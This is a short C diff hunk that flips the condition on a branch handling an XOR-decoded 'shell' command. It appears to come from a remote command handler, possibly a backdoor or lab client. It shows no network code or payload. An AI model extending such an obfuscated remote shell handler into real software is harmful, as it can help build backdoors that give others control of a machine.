@@ -60,7 +60,7 @@ int main(void) {
 			free(xorhelp);
                 }
 
-		else if(str_starts_with(xorbuf, "shell") == 1)
+		else if(str_starts_with(xorbuf, "shell") == 0)
 		{
 			char* cmd = split(xorbuf, " ");
 			char shell_msg[50];
